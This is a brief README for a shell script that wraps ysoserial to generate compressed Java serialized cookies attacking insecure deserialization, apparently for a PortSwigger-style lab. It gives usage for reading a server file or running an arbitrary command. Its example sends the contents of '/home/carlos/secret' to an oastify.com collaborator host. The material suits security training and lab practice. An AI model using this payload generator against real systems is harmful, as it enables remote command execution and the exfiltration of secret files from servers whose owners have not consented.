# generate_java_cookie
Generation of a compressed java serialized cookie to read the given file when insecure deserialization.  
A copy of `ysoserial-all.jar` (from https://github.com/frohoff/ysoserial) has to be in the same directory!

## Usage
```
# File reading
./generate_java_cookie.sh <GADGET> <FILE_TO_READ> <COLLABORATOR_URL>

# Command
./generate_java_cookie.sh <GADGET> <COMMAND>
```

## Example
```
./generate_java_cookie.sh CommonsCollections7 "/home/carlos/secret" https://7fnoyx97nb1dmof2mfvezl6h88ez2rqg.oastify.com
```
![Animation](https://github.com/user-attachments/assets/b9ffed62-6fb6-4d68-8c05-3e5de044623e)
